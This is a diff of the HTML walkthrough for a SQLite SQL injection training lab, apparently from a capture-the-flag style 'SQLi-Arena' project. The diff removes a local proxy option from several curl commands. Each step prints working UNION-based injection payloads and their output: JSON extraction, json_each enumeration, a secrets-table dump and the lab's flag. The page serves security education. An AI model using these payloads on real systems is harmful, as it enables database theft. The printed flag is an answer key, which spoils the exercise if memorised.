@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Config View</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=1"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=1"<br>
         <span class="prompt">SQL: </span>SELECT id, json_extract(config_json, '$.version') AS version, json_extract(config_json, '$.debug') AS debug FROM app_config WHERE id = 1<br><br>
         <span class="prompt">Output:</span><br>
         id | version | debug<br>
@@ -29,7 +29,7 @@
         <span class="terminal-title">Step 2. Raw JSON Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, config_json, 3 FROM app_config WHERE id=1"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, config_json, 3 FROM app_config WHERE id=1"<br><br>
         <span class="prompt">Output:</span><br>
         id | version | debug<br>
         1 | {"debug":false,<strong>"flag":"FLAG{sq_js0n_3xtr4ct_1nj}"</strong>,"version":"2.0"} | 3<br><br>
@@ -48,7 +48,7 @@
         <span class="terminal-title">Step 3: json_extract with $.flag</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, json_extract((SELECT config_json FROM app_config WHERE id=1), '$.flag'), 3"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, json_extract((SELECT config_json FROM app_config WHERE id=1), '$.flag'), 3"<br><br>
         <span class="prompt">Output:</span><br>
         id | version | debug<br>
         1 | <strong>FLAG{sq_js0n_3xtr4ct_1nj}</strong> | 3
@@ -66,7 +66,7 @@
         <span class="terminal-title">Step 4: json_each() Key-Value Enumeration</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT key, value, type FROM json_each((SELECT config_json FROM app_config WHERE id=1))"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT key, value, type FROM json_each((SELECT config_json FROM app_config WHERE id=1))"<br><br>
         <span class="prompt">Output:</span><br>
         id | version | debug<br>
         debug | 0 | false<br>
@@ -84,7 +84,7 @@
         <span class="terminal-title">Step 5: json_secrets Table</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT id, secret_data, 'found' FROM json_secrets"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT id, secret_data, 'found' FROM json_secrets"<br><br>
         <span class="prompt">Output:</span><br>
         id | version | debug<br>
         1 | <strong>FLAG{sq_js0n_3xtr4ct_1nj}</strong> | found
@@ -105,7 +105,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, json_extract((SELECT config_json FROM app_config WHERE id=1), '$.flag'), 3"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, json_extract((SELECT config_json FROM app_config WHERE id=1), '$.flag'), 3"
     </div>
 </div>
 
